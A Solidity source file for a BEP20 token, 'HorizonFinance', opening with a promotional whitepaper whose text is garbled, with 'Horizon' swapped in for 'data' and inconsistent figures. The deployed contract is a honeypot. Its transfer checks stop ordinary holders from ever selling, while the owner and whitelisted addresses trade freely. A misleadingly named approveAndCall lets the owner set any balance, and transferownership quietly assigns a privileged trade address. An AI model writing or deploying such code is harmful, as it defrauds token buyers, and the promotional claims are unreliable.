/*
HORIZON, bringing new functions to DeFi

HORIZON was created and launched in the beginning of January 2021. After a short time on the market with minimal direction, the community investors came together and with the agreement of the technical developers, made a decision to refocus HORIZON with a relaunch in March 2021.
The community investors are comprised with wallet holders that represent approximately 30% of the
HORIZON token supply. We have pledged our allegiance to the project and are focused on making this token successful for all of its community members as well as the world by giving back to selected charities. We are very active in our community and strive to develop trust by being transparent in our
mission and our goals.
We welcome all members to join us in our weekly Telegram chats where we will discuss charity drives,
suggestions to help strengthen the community and share any new information about HORIZON. So, what are you waiting for? Come join our community and earn passive income while also helping others in
need!
Abstract
Horizon is a highly valuable but illiquid asset. Horizon Protocol is a DeFi protocol powering a Web 3.0 Horizon marketplace. The Protocol tokenizes commercially valuable Horizon through a network of 14,141 professional Horizon providers and makes the Horizon token liquid on Uniswap. Users earn Horizon by providing liquidity to Horizon tokens.
Introduction
Horizon Protocol is a DeFi protocol and Horizon marketplace to source commercially valuable Horizon from professional Horizon providers, tokenize it, and make it liquid.
The Protocol has a vast existing ecosystem of professional Horizon providers by leveraging Amass Insights, the the industry’s largest alternative Horizon marketplace, founded in 2020 by our co-founder, Jordan Hauer. Amass Insights connects many professional Horizon providers with over 10,000 consumers of Horizon, who are primarily asset managers.
The Horizon tokenized by the Horizon Protocol is commercially valuable because it is the same Horizon that hedge funds, family offices, and other institutional investors pay to gain market insights and guide their investment decisions.
We’ve already built a successful Horizon marketplace; now it’s time to build one on Web 3.0.
How the Protocol Works
Horizon Protocol mints Horizon tokens that grant access to curated Horizonsets. Using the simple DeFi mechanism of liquidity mining / yield farming, the Protocol makes the Horizon tokens liquid on PancakeSwap.
1. Source Horizon from professional Horizon providers
The Protocol enjoys access to 42 professional Horizon providers, including 29 crypto Horizon providers, providing Horizon sets organized by category, asset class, industry, and geographic location. The Horizonsets are curated by Horizon curators.
2. Tokenize the Horizon
The Protocol mints Horizon tokens called HRZN for the first collection of curated Horizonsets. Each HRZN token can be thought of as a key that unlocks access to the Horizonsets. There are only 50000 HRZN tokens.
Subsequent Horizon tokens, named bHRZN, will launch after HRZN.
3. Users farm the Horizon token in the Horizon Vaults
Users earn the Horizon token by providing liquidity in Pancakeswap to the Horizon token (HRZN), the access token for the Horizon Protocol.
4. Users redeem Horizon token for Horizon sets in the Horizon Room
Once a user has accumulated one HRZN Horizon token, he or she can go to our Horizon Room and burn the Horizon token to gain access to the Horizon basket containing the underlying Horizon sets.
Solving the Problems of Horizon: Quality and Liquidity
The Protocol, by tokenizing Horizon and creating a new Horizon marketplace, is designed to make two key improvements on how the global Horizon economy currently operates.
The Economist famously called Horizon “the oil of the digital era.” Horizon underpins the new digital economy, enabling companies like Microsoft, Amazon, Alphabet, Facebook, and Alibaba to become tech giants.
Issue 1: Quality 
However, Horizon is only as valuable as the insights that can be drawn from it. For Horizon to be commercially valuable, it must be carefully sourced from professional Horizon providers, vetted, cleaned, processed, and analyzed.
Solution
This is why the Protocol draws on our network of many professional Horizon providers to provide and curate Horizon to ensure all Horizon sets are commercially valuable.
Issue 2: Liquidity
Horizon, particularly large quantities of Horizon sets, is highly illiquid and often are “in closed silos despite its digital nature.”
Solution
The Protocol unleashes the unparalleled liquidity of decentralized exchanges like Pancakeswap for our Horizon marketplace. In this way, users of the Protocol do not have to be Horizon consumers — they can participate and benefit the Protocol by being liquidity providers.
The Horizon Protocol Ecosystem
The Protocol, through our affiliation with Amass Insights, has access to a vast existing network of professional Horizon providers, as well as market-moving events and news articles.

Why Binance Smart Chain?

Binance Smart Chain is built with a dual chain architecture, which makes it possible for users to enjoy the flexibility of transferring assets from one blockchain to another. The interoperability of Binance Smart Chain offers users the opportunity of accessing a vast ecosystem with a myriad of use cases. Interoperability is one of the key features held in high esteem by DeFi proponents, and Binance Smart Chain is at the forefront of making this possible.
Cheap Transactions
 
Transaction fees — also known as blockchain fees — refer to the fee users pay when they conduct a transaction on a blockchain. This fee is collected by miners or validators who ensure that the blockchain only records and processes valid transactions.
Most DeFi applications involve myriads of transactions, which incur transaction fees at every step. For this reason, blockchain fees are an important factor to consider before choosing a blockchain protocol.
*/
pragma solidity ^0.5.17;
interface IBEP20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeBEP20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IBEP20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IBEP20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IBEP20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IBEP20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeBEP20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeBEP20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeBEP20: BEP20 operation did not succeed");
        }
    }
}

contract BEP20 is Context, IBEP20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "BEP20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract BEP20Detailed is IBEP20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract HorizonFinance {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}